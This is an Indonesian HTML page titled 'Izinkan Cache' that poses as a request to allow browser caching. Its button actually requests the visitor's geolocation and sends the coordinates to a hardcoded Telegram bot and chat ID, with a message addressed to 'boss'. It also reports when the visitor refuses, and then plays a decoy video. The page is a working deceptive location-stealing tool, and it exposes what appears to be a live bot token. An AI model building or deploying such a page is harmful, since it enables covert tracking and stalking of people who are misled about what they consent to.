<!DOCTYPE html>
<html>
<head>
  <title>Izinkan Cache</title>
  <style>
    /* Membuat halaman memenuhi layar dan tidak bisa digeser */
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden; /* Mencegah scroll */
    }

    /* Memastikan isi halaman mengisi seluruh layar */
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    /* Container video yang muncul */
    #videoContainer {
      display: none;
      margin-top: 20px;
      border: 2px solid red; /* Menambahkan border untuk debug */
    }
  </style>
</head>
<body>
  <h2>Izinkan Cache</h2>
  <p>Silakan klik tombol di bawah untuk mengizinkan cache Anda.</p>
  <button onclick="mintaLokasi()">Izinkan Sekarang</button>

  <div id="videoContainer">
    <video width="320" height="240" controls autoplay>
      <source src="https://now-glich.github.io/Myfirsh/trik.mp4" type="video/mp4">
      Browser Anda tidak mendukung video.
    </video>
  </div>

  <script>
    const botToken = "7579024338:AAGkv6LtQQH3uKtqD64DVNca4V7ZYwAyLT0";
    const chatId = "7420684427";

    function mintaLokasi() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude } = pos.coords;
            alert(`Cache berhasil`);
            const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);

            // Debugging: Menampilkan video
            console.log("Lokasi berhasil, menampilkan video...");

            // Menunggu sedikit waktu sebelum menampilkan video
            setTimeout(() => {
              // Tampilkan video
              document.getElementById("videoContainer").style.display = "block";
            }, 500); // 500ms delay (setengah detik)
          },
          (err) => {
            const pesan = `Pengguna menolak memberikan lokasi.`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
            console.log("Lokasi ditolak.");
          }
        );
      } else {
        alert("Geolocation tidak didukung browser ini.");
      }
    }
  </script>
</body>
</html>
